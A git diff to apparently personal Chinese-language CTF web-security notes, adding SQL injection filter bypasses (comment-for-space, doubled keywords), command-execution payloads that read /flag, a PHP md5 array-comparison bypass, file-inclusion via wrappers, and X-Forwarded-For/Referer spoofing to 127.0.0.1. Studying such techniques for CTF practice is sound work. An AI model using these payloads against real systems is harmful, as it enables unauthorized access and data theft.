@@ -38,6 +38,16 @@ union select 1,database(),group_concat(table_name)from information_schema.tables
 
    union select 1,database(),group_concat(fllllag)from fl4g--+
 
+6. 跳过过滤：
+
+   空格：转换为/**/
+
+   union：双写为ununionion
+
+
+
+
+
 
 
 #### 布尔盲注
@@ -107,3 +117,34 @@ python sqlmap.py -u "http://node4.anna.nssctf.cn:28366/?id=1" --dump
 
 如何传入文件？
 
+system(cat /flag)
+
+#### 文件包含
+
+posh不要随便加空格
+
+如何绕过waf？
+
+先利用伪协议查看index.php的编码
+
+找到条件并跳过即可
+
+#### md5数组绕过
+
+```
+if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
+    echo $FLAG;
+} 
+```
+
+此时传入两个数组即可，因为数组可以被传入md5，但是会返回NULL。
+
+#### XXF
+
+从本地页面跳转使用
+
+X-Forwarded-For: 127.0.0.1
+
+Referer:127.0.0.1
+
+遇到将字符作为语句执行 可以将该字符设置为system("cat /f*")
